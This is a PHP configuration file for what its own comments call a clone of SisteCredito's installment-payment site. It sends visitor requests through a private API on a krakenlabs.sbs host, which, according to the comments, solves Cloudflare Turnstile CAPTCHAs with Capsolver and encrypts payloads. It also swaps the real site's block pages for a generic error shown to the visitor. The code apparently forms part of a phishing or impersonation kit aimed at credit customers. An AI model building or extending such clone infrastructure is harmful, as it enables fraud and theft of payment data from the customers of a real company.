<?php
// ============================================================================
// config.php - Configuracion global del sitio clon SisteCredito (paga tu cuota)
// El PHP NO llama a SisteCredito directamente: consulta a la API propia
// api-sistecredito.krakenlabs.sbs (Node + Express + PM2 en VPS10), que es la
// que resuelve turnstile (Capsolver), cifra payloads y maneja el flujo.
// ============================================================================

define('SC_API_BASE', 'https://sc-tunnel.krakenlabs.sbs');
define('SC_API_TIMEOUT', 120);

// --- proxy hacia la API propia (api-sistecredito.krakenlabs.sbs) ---
// $endpoint: ruta de la API (ej: 'authorizations', 'credits', 'fees/xxx')
// $body: payload para POST/PUT (null en GET)
function sc_api_call(string $endpoint, ?array $body = null, string $method = 'GET'): array
{
    $url = SC_API_BASE . '/' . ltrim($endpoint, '/');
    $ch = curl_init($url);
    $headers = ['Content-Type: application/json'];
    $opts = [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_TIMEOUT => SC_API_TIMEOUT,
        CURLOPT_SSL_VERIFYPEER => true,
        CURLOPT_CUSTOMREQUEST => $method,
    ];
    if ($body !== null) {
        $opts[CURLOPT_POSTFIELDS] = json_encode($body, JSON_UNESCAPED_UNICODE);
    }
    if ($method === 'POST') {
        $headers[] = 'X-Requested-With: XMLHttpRequest';
    }
    $opts[CURLOPT_HTTPHEADER] = $headers;
    curl_setopt_array($ch, $opts);
    $resp = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $err = curl_error($ch);
    curl_close($ch);
    if ($resp === false) {
        return ['status' => 502, 'json' => null, 'text' => json_encode(['success' => false, 'error' => 'curl: ' . $err])];
    }
    $json = json_decode($resp, true);
    if (json_last_error() !== JSON_ERROR_NONE) {
        // el VPS10 devolvio HTML (probablemente pagina de bloqueo CF de sistecredito.com)
        $clean = ['success' => false, 'error' => 'El servicio no esta disponible temporalmente. Intenta mas tarde.'];
        if (is_string($resp) && preg_match('/cloudflare|Sorry, you have been blocked|cf-error|Attention Required!/i', $resp)) {
            $clean['_blocked'] = true;
            return ['status' => 503, 'json' => $clean, 'text' => json_encode($clean)];
        }
        // cualquier otro HTML: tambien saneamos
        return ['status' => 502, 'json' => $clean, 'text' => json_encode($clean)];
    }
    // el VPS10 devolvio JSON, pero chequeamos si algun valor contiene HTML de CF
    // (caso api-sistecredito hace echo del HTML crudo en vez de fallar)
    $cleanError = ['success' => false, 'error' => 'El servicio no esta disponible temporalmente. Intenta mas tarde.', '_blocked' => true];
    if (is_array($json)) {
        // si las claves error/message/某 value contienen "Sorry, you have been blocked" o cloudflare
        $scan = json_encode($json, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
        if (preg_match('/Sorry, you have been blocked|Attention Required!|cf-error-details|cloudflare\.com\/5xx-error/i', $scan)) {
            return ['status' => 503, 'json' => $cleanError, 'text' => json_encode($cleanError)];
        }
    }
    return ['status' => $code, 'json' => $json, 'text' => $resp];
}

// --- respuesta JSON estandar ---
function sc_json(array $data, int $status = 200): void
{
    http_response_code($status);
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode($data, JSON_UNESCAPED_UNICODE);
    exit;
}

// --- sesion (estado por usuario, opcional por ahora) ---
function sc_session_start(): void
{
    if (session_status() === PHP_SESSION_NONE) {
        session_start();
    }
}
